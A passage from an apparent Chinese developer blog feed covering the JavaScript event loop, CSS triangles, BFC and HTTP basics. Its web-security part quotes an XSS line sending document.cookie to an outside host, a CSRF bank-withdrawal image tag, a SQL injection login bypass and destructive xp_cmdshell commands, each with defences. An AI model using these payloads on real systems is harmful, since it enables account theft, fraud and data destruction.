主线程在执行完当前循环中所有代码后，就会到消息队列取出这条消息（也就是message函数），并执行它，到此为止，就完成了工作线程对主线程的通知，回调函数也就得到了执行。如果一开始主线程就没有提供回调函数，Ajax线程在收到HTTP响应后，也就没有必要通知主线程，从而没必要往消息队列放消息。 异步过程的回调函数，一定不在当前这一轮事件循环中执行。 5、异步与事件 消息队列中的每条消息实际上都对应着一个事件 有一类很重要的异步过程：DOM事件 1234var button = document.getElement(&apos;#btn&apos;);button.addEventListener(&apos;click&apos;, function(e) &#123; console.log();&#125;); 从事件的角度来看，上述代码表示：在按钮上添加了一个鼠标单击事件的事件监听器；当用户点击按钮时，鼠标单击事件触发，事件监听器函数被调用。 从异步过程的角度看，addEventListener函数就是异步过程的发起函数，事件监听器函数就是异步过程的回调函数。事件触发时，表示异步任务完成，会将事件监听器函数封装成一条消息放到消息队列中，等待主线程执行。 事件的概念实际上并不是必须的，事件机制实际上就是异步过程的通知机制。我觉得它的存在是为了编程接口对开发者更友好。 另一方面，所有的异步过程也都可以用事件来描述。例如：setTimeout可以看成对应一个时间到了！的事件。前文的setTimeout(fn, 1000);可以看成： 1timer.addEventListener(&apos;timeout&apos;, 1000, fn); 工作线程是生产者，主线程是消费者(只有一个消费者)。工作线程执行异步任务，执行完成后把对应的回调函数封装成一条消息放到消息队列中；主线程不断地从消息队列中取消息并执行，当消息队列空时主线程阻塞，直到消息队列再次非空。 6、macrotasks与microtasks的区别 macrotasks: setTimeout setInterval setImmediate I/O UI渲染 microtasks: Promise process.nextTick Object.observe MutationObserver microtask会在当前循环中执行完成,而macrotask会在下一个循环中执行]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[纯css三角形及其应用]]></title>
    <url>%2F2018%2F08%2F27%2F%E7%BA%AFcss%E4%B8%89%E8%A7%92%E5%BD%A2%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[前言对于气泡对话框或者Popover与内容连接部分会有小三角形效果，可能在以前直接用图片去实现，其实用纯css即可实现，下面要实现的效果分别是微信对话框和面包屑，以此回顾记录一下。 效果如下： css写三角形原理首先我们设置一个div元素的宽高和边框，观察效果 1234567.demo1 &#123; width: 40px; height: 40px; border-width: 20px; border-style: solid; border-color: #ff0000 #00ff00 #0000ff #ff00ff;&#125; 效果 可以发现分别观察四边框是按类似等边梯形绘制的，如果进一步把宽高设小，甚至设为0，就会呈现为三角形，于是 1234567.demo2 &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: #ff0000 #00ff00 #0000ff #ff00ff;&#125; 效果 果然是这样的，下面要做的是把其中某个三角形单独提取出来显示，其他都显示为transparent，于是就有了 12345678.demo3 &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: transparent; border-left-color: #ff00ff;&#125; 效果 一个指向右边的三角形大功告成，要其他方向的三角形，只需改变透明的边框即可。 应用有时我们不需要整个实心的三角形，而只需要类似与&gt;不同方向箭头的效果，例如popover气泡框效果。这样就需要两个三角形通过重叠错位来实现这样的效果，重叠三角形B颜色和气泡框背景色一样，被重叠三角形A颜色和气泡框边框颜色一样。 实现微信对话框效果两个三角形重叠错位，意味着要两个元素，但是这样一来就增加了这个小功能的复杂度，其实可以利用标签的伪类元素:before和:after来充当元素画出两个三角形。 html部分1&lt;div class="chat-dialog"&gt;hi，在吗？&lt;/div&gt; css部分123456789101112131415161718192021222324252627282930.chat-dialog &#123; position: relative; width: 180px; height: 32px; line-height: 32px; border-radius: 5px; margin-left: 30px; border: 1px solid #009a61; padding: 4px;&#125;.chat-dialog:before,.chat-dialog:after &#123; content: ""; display: block; position: absolute; top: 13px; left: -13px; width: 0; height: 0; border-width: 6px; border-color: transparent; border-style: solid; border-right-color: #009a61;&#125;.chat-dialog:after &#123; left: -12px; border-right-color: #fff;&#125; 效果 实现面包屑效果同样的实现面包屑效果，只是在每块后面留出空位，再用伪类元素:before和:after定位出箭头效果 html部分 123456&lt;ul class="tag-tab"&gt; &lt;li&gt;第一级&lt;/li&gt; &lt;li&gt;第二级&lt;/li&gt; &lt;li&gt;第三级&lt;/li&gt; &lt;li&gt;第四级&lt;/li&gt;&lt;/ul&gt; css部分 1234567891011121314151617181920212223242526272829303132333435363738.tag-tab &#123; font-size: 16px; height: 24px; list-style: none;&#125;.tag-tab li &#123; float: left; position: relative; padding-right: 12px;&#125;.tag-tab&gt;li:before,.tag-tab&gt;li:after &#123; position: absolute; top: 0; right: -12px; border-width: 12px; border-color: transparent; border-left-color: #333; border-style: solid; content: ""; z-index: 1;&#125;.tag-tab&gt;li:after &#123; right: -11px; border-left-color: #fff;&#125;.tag-tab&gt;li:hover &#123; color: #009a61;&#125;.tag-tab&gt;li:hover:before &#123; border-left-color: #009a61;&#125; 效果 当然，还是css3通过旋转实现的方法，简单粗暴，到后面在补充了。还有什么好方法欢迎提出哈。]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解BFC]]></title>
    <url>%2F2018%2F08%2F27%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3BFC%2F</url>
    <content type="text"><![CDATA[1、相关定义1.1 Formatting contextFormatting context是W3C CSS2.1规定中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素如何定位，以及和其他元素的关系和相互作用。最常见的Formatting context有Block formatting context（简称BFC）和Inline formatting context（简称IFC）。css2.1中只有BFC和IFC，css3中还增加了GFC和FFC。 1.2 BFC定义BFC(Block formatting context)直译为“块级格式化上下文”。它是独立的渲染区域，只有Block-level box参与，它规定了内部的Block-level Box如何布局，并且与这个区域外部毫不相干。 1.3 BFC布局规则： 内部的Box会在垂直方向，一个接一个地放置； Box垂直方向地距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠 每个元素的margin box的左边，与包含块border box的左边相接触（对于从左往右的格式化，否则相反）。即便存在浮动也是如此。 BFC的区域不会与float box重叠。 BFC就是页面的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。 计算BFC的高度时，浮动元素页参与计算。-2、作用 2.1 可生成BFC的元素 根元素html； float属性不为none； position为absolute或fixed； display为inline-block， table-cell，table-caption，flex， inline-flex； overflow不为visible； 2.2 场景一：对于两栏或三栏浮动自适应布局，包含块边接触问题。12345678910111213141516171819202122232425&lt;style&gt; .left-center-right.float .left &#123; float: left; width: 200px; height: 100px; background-color: rgba(0, 0, 0, 0.7); &#125; .left-center-right.float .center &#123; background-color: rgb(13, 218, 233); height: 200px; &#125; .left-center-right.float .right &#123; float: right; width: 200px; height: 150px; background-color: rgb(189, 109, 109); &#125;&lt;/style&gt;&lt;section class=&quot;left-center-right float&quot;&gt; &lt;article class=&quot;left&quot;&gt;我是左边区域块&lt;/article&gt; &lt;article class=&quot;right&quot;&gt;我是右边区域块&lt;/article&gt; &lt;article class=&quot;center&quot;&gt;我是中间区域块&lt;/article&gt;&lt;/section&gt; 中间自适应栏边界会延展左右浮动区域 此时需要把中间栏变成BFC 12345.left-center-right.float .center &#123; background-color: rgb(13, 218, 233); height: 200px; overflow: hidden;&#125; 2.3 场景二：子级元素有浮动，父级元素塌陷问题12345678910111213141516171819&lt;style&gt; .all-children-float .left &#123; float: left; width: 200px; height: 100px; background-color: rgba(0, 0, 0, 0.7); &#125; .all-children-float .right &#123; float: right; width: 200px; height: 150px; background-color: rgb(189, 109, 109); &#125;&lt;/style&gt;&lt;section class=&quot;all-children-float&quot;&gt; &lt;article class=&quot;left&quot;&gt;我是左边区域块&lt;/article&gt; &lt;article class=&quot;right&quot;&gt;我是右边区域块&lt;/article&gt;&lt;/section&gt; 此时需要将父级元素变成BFC 123.all-children-float &#123; position: absolute;&#125; 2.3 场景三：垂直方向margin出现重合12345678910111213141516171819&lt;style&gt; .verticle-block .block1 &#123; width: 200px; height: 150px; background-color: rgb(13, 218, 233); margin: 20px; &#125; .verticle-block .block2 &#123; width: 150px; height: 150px; background-color: rgb(189, 109, 109); margin: 30px; &#125;&lt;/style&gt;&lt;section class=&quot;verticle-block&quot;&gt; &lt;article class=&quot;block1&quot;&gt;我是区域块1&lt;/article&gt; &lt;article class=&quot;block2&quot;&gt;我是区域块2&lt;/article&gt;&lt;/section&gt; Box垂直方向的距离margin决定，属于同一个BFC的两个相邻Box的margin会发生重叠。 我们的做法是包一层标签，并转化成BFC。 12345678910.wrapper1 &#123; overflow: hidden;&#125;&lt;section class=&quot;verticle-block&quot;&gt; &lt;div class=&quot;wrapper1&quot;&gt; &lt;article class=&quot;block1&quot;&gt;我是区域块1&lt;/article&gt; &lt;/div&gt; &lt;article class=&quot;block2&quot;&gt;我是区域块2&lt;/article&gt;&lt;/section&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css BFC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议总结（整理版）]]></title>
    <url>%2F2018%2F08%2F27%2FHTTP%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93%EF%BC%88%E6%95%B4%E7%90%86%E7%89%88%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基本概念1.1 web基础 HTTP（HyperText Transfer Protocol）：超文本传输协议。 WWW（World Wide Web）的三种技术：HTML、HTTP、URL。 RFC（Request for Comments）：征求修正意见书，互联网的设计文档。 1.2 URL URI（Uniform Resource Indentifier）：统一资源标识符。 URL（Uniform Resource Locator）：统一资源定位符。 URN（Uniform Resource Name）：统一资源名称。 ps:URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。 1.3 请求和响应报文1.3.1 请求报文 1.3.2 响应报文 二、HTTP方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。 2.1 GET获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 2.2 HEAD获取报文首部 和 GET 方法一样，但是不返回报文实体主体部分。 主要用于确认 URL 的有效性以及资源更新的日期时间等。 2.3 POST传输实体主体 POST主要用来传输数据，而GET主要用来获取资源。 2.4 PUT上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 2.5 PATCH对资源进行部分修改 PUT也可以用于修改资源，但是只能完全替代原始资源，PATCH允许部分修改。 2.6 DELETE删除文件 与PUT功能相反，并且同样不带验证机制。 2.7 OPTIONS查询支持的方法 查询指定的URL能够支持的方法。返回Allow:GET,POST,HEAD,OPTIONS这样的内容。 2.8 CONNECT要求用隧道协议连接代理 要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 2.9 TRACE追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。 三、HTTP状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 解释 1xx Informational（信息性状态码） 接收的请求正在处理 2xx Success（成功状态码） 请求正常处理完毕 3xx Redirection（重定向状态码） 需要进行附加操作以完成请求 4xx Client Error（客户端错误状态码） 服务器无法处理请求 5xx Server Error（服务器错误状态码） 服务器处理请求出错 3.1 1xx信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 3.2 2xx成功 200 OK：请求成功并返回。 204 No Content：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。 3.3 3xx重定向 301 Moved Permanently：永久性重定向。 302 Found：临时性重定向。 303 See Other：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。PS：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 3.4 4xx客户端错误 400 Bad Request：请求报文中存在语法错误。 401 Unauthorized：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden：请求被拒绝，服务器端没有必要给出拒绝的详细理由。 404 Not Found：未找到客户端要请求的资源。 3.5 5xx服务器错误 500 Internal Server Error：服务器正在执行请求时发生错误。 503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、HTTP首部有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段 4.1 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 4.2 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 4.3 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 4.4 实体首部字段 首部字段名 说明 Allow 资源可支持的 HTTP方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 五、具体应用5.1 Cookie HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。 Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。 5.1.1 创建过程 服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] 客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段。 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 5.1.2 分类 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 5.1.3 Set-Cookie 属性 说明 NAME=VALUE 赋予 Cookie 的名称和其值（必需项） expires=DATE Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止） path=PATH 将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录） domain=域名 作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名） Secure 仅在 HTTPs 安全通信时才会发送 Cookie HttpOnly 加以限制，使 Cookie 不能被 JavaScript 脚本访问 5.1.4 Session和Cookie区别Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。 5.1.5 浏览器禁用Cookie的情况会使用URL重写技术，在URL后面追缴sid=xxx。 5.1.6 使用 Cookie 实现用户名和密码的自动填写 网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。-但是如果 Set-Cookie 指定了 HttpOnly属性，就无法通过 Javascript脚本获取 Cookie信息，这是出于安全性考虑。 5.2 缓存5.2.1 优点 降低服务器的负担。 提高响应速度。（缓存资源比服务器上的资源离客户端更近） 5.2.2 实现方法 让代理服务器进行缓存。 让客户端浏览器进行缓存。 5.2.3 Cache-Control 字段 HTTP 通过 Cache-Control 首部字段来控制缓存。 1Cache-Control: private, max-age=0, no-cache 5.2.4 no-cache 指令 该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期 该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性 5.2.5 no-store 指令 该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。 no-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。 5.2.6 max-age 指令 该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。 该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。 Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。 5.3 持久化连接当浏览器访问一个包含多张图片的HTML页面时，除了请求访问HTML页面资源，会请求图片资源，如果每进行依次HTTP通信就要断开一次TCP连接，连接建立和断开的开销会很大。持久化连接只需要建立一次TCP连接就能进行多次HTTP通信。 持久化连接需要使用Connection首部字段进行管理。HTTP/1.1开始，默认时持久化连接的，如果要断开TCP连接，需要由客户端或者服务器端提出断开，使用Connection:close;，而在HTTP/1.1之前默认是非持久化连接的，如果要维持持续连接，需要使用Connection:Keep-Alive;。 5.4 管线化处理HTTP/1.1支持管线化处理，可以同事发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发送下一个请求。 5.5 编码编码（Encoding）主要是为了对实体进行压缩。常用的编码由：gzip、compress、deflate、identity，其中identity表示不执行压缩的编码格式。 5.6 分块传输编码Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。 5.7 多部分对象集合一份报文主体内可包含多种类型的实体同事发送，每个部分之间用boundary字段定义的分隔符进行分隔，每个部分都可以有首部字段。 例如，上传多个表单时可以使用如下方式： 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name=&quot;submit-name&quot;Larry--AaB03xContent-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 5.8 范围请求如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。 再请求报文首部中添加Range字段指定请求的范围，请求成功的话服务器发送206 Partial Content 状态。 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 5.9 内容协商通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。 涉及一下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。 5.10 虚拟机HTTP/1.1使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。使用Host首部字段进行处理。 5.11 通信数据转发5.11.1 代理代理服务器接收客户端的请求，并且转发给其他服务器 使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。 代理服务器分为正向代理和反向代理两种，用户察觉到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。 5.11.2 网关与代理服务器不同的是，网关服务器会将HTTP转化为其他协议进行通信，从而请求其他非HTTP服务器的服务。 5.11.3 隧道使用SSL等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析HTTP请求。 六、HTTPSHTTP有一下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改； HTTPS并不是新协议，而是HTTP先和SSL（Secure Sockets Layer）通信，再由SSL和TCP通信。也就是说HTTPS使用了隧道进行通信。通过使用SSL，HTTPS具有了加密、认证和完整性保护。 6.1 加密6.1.1 对称密钥加密堆成密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。 优点：运算速度快。 缺点：密钥容易被获取。 6.1.2 公开密钥加密公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 优点：更为安全。 缺点：运算速度慢。 6.1.3 HTTPS采用的加密方式HTTPS采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。 6.2 认证通过使用证书来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 进行HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。 使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。 6.3 完整性SSL提供报文摘要功能来验证完整性。 七、Web攻击技术7.1 攻击模式7.1.1 主动攻击直接攻击服务器，具有代表性的有SQL注入和OS命令注入。 7.1.2 被动攻击设下圈套，让用户发送有攻击代码的HTTP请求，用户会泄露cookie等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。 7.2 跨站脚本攻击7.2.1 概念跨站脚本攻击（Cross-Site Scripting,XSS）,可以将代码注入到用户浏览的网页上，这种代码包括HTML和JavaScript。利用网页开发时留下的漏洞，通过巧妙地方法注入恶意指令代码到网页，是用户加载并执行攻击者恶意制造地网页程序。攻击成功后，攻击者可能得到更高地权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 例如一个论坛网站，攻击者可以再上面发表一下内容： 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; 之后该内容可能会被渲染成一下形式： 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。 7.2.2 危害伪造虚假地输入表单骗取个人信息，窃取用户地cookie值，显示伪造地文章或图片。 7.2.3 防范手段 过滤特殊字符。 指定HTTP的content-type。 7.3 跨站点请求伪造7.3.1 概念跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 XSS利用的时用户对指定网站的信任，CSRF利用的是网站对用户网页浏览器的信任。 假如一家银行用以执行转账操作的 URL 地址如下： 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName 那么，一个恶意攻击者可以在另一个网站上放置如下代码： 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。 8.3.2 防范手段检查 Referer 字段 HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。 添加校验 Token 由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。 7.4 SQL注入攻击7.4.1 概念服务器上的数据库运行非法的SQL语句。 7.4.2 攻击原理例如一个网站登录验证的SQL查询代码为 1strSQL = &quot;SELECT * FROM users WHERE (name = &apos;&quot; + userName + &quot;&apos;) and (pw = &apos;&quot;+ passWord +&quot;&apos;);&quot; 如果填入以下内容： 12userName = &quot;1&apos; OR &apos;1&apos;=&apos;1&quot;;passWord = &quot;1&apos; OR &apos;1&apos;=&apos;1&quot;; 那么 SQL 查询字符串为： 1strSQL = &quot;SELECT * FROM users WHERE (name = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;) and (pw = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;);&quot; 此时无需验证通过就能执行以下查询： 1strSQL = &quot;SELECT * FROM users;&quot; 7.4.3 危害 数据表中的数据外泄，例如个人机密数据，账户数据，密码等。 数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。 数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。 获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell “net stop iisadmin” 可停止服务器的 IIS 服务）。 破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell “FORMAT C:”）。 7.4.4 防范手段 在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。 在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。 如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。 使用 SQL 防注入系统。 7.5 拒绝服务攻击7.5.1 概念 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。 八、GET 和 POST 的区别8.1 参数 GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体中。 GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 8.2 安全 安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 -不安全的方法除了 POST 之外还有 PUT、DELETE。 8.3 幂等性 